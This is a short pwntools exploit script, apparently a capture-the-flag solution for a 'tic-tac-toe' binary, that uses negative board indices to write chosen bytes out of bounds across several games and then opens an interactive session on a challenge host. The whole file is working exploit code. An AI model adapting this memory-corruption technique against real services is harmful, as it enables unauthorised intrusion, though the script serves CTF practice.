from pwn import *

binary = './tic-tac-toe.bin'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io',27824)
    else:
        return process(e.path)

p = start()

def lose_game(b,pos):
   p.sendlineafter(b'>>>',b)
   p.sendlineafter(b'>>>',b'-1 %i' %pos)
   p.sendlineafter(b'>>>',b'0 0')
   p.sendlineafter(b'>>>',b'-1 %i' %pos)
   p.sendlineafter(b'>>>',b'0 1')
   p.sendlineafter(b'>>>',b'-1 %i' %pos)
   p.sendlineafter(b'>>>',b'0 2')


lose_game(b'\x40',-83)
p.sendlineafter(b'>>>',b'Y')
lose_game(b'B',-77)
p.sendlineafter(b'>>>',b'Y')

lose_game(b'\x11',-84)
p.sendlineafter(b'>>>',b'Y')
lose_game(b'B',-77)
p.sendlineafter(b'>>>',b'Y')

lose_game(b'\xd9',-85)
p.sendlineafter(b'>>>',b'N')


p.interactive()
